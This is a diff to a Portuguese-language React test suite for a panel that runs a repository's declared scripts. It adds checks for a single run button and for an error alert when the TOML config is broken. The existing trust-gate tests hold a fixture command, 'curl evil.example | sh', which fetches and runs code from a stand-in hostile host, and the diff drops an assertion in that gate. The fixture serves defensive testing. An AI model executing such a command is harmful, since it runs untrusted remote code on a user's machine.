@@ -152,6 +152,20 @@ describe("o botão que abre a porta", () => {
 });
 
 describe("rodar e parar", () => {
+  it("o gesto de rodar existe uma vez só, na barra", async () => {
+    // Achado pelo e2e: o corpo repetia o botão da barra, a uma mão de distância.
+    trpcMock.scripts.status.query.mockResolvedValue(
+      status({
+        scripts: { setup: null, run: "pnpm dev", teardown: null },
+        run: { command: "pnpm dev", last: null },
+      }),
+    );
+
+    renderWithProviders(<RunDock scope={scope} dock={dock} />);
+
+    expect(await screen.findAllByRole("button", { name: /rodar/ })).toHaveLength(1);
+  });
+
   it("roda o que o repositório declara", async () => {
     trpcMock.scripts.status.query.mockResolvedValue(
       status({ scripts: { setup: null, run: "pnpm dev", teardown: null }, run: { command: "pnpm dev", last: null } }),
@@ -220,7 +234,6 @@ describe("o portão de confiança (S11)", () => {
 
     expect(await screen.findByText("curl evil.example | sh")).toBeInTheDocument();
     expect(screen.getByRole("button", { name: /confiar neste projeto/ })).toBeInTheDocument();
-    expect(screen.queryByRole("button", { name: /rodar agora/ })).not.toBeInTheDocument();
   });
 
   it("confiar é decisão de projeto, e volta a perguntar se o comando mudar", async () => {
@@ -257,6 +270,20 @@ describe("o setup que falhou", () => {
 
     expect(await screen.findByText(/o setup dela falhou/)).toBeInTheDocument();
     expect(screen.getByRole("button", { name: /tentar de novo/ })).toBeInTheDocument();
+  });
+});
+
+describe("o checkout que não dá para ler", () => {
+  it("mostra o motivo em vez de ficar em `lendo o checkout…` para sempre", async () => {
+    // Achado pelo e2e: `[scripts]` com TOML quebrado. O daemon recusa com o
+    // motivo, e a tela precisava saber mostrar.
+    trpcMock.scripts.status.query.mockRejectedValue(
+      new Error(".lumem/project.toml não é TOML válido: linha 5"),
+    );
+
+    renderWithProviders(<RunDock scope={scope} dock={dock} />);
+
+    expect(await screen.findByRole("alert")).toHaveTextContent(/não é TOML válido/);
   });
 });
 
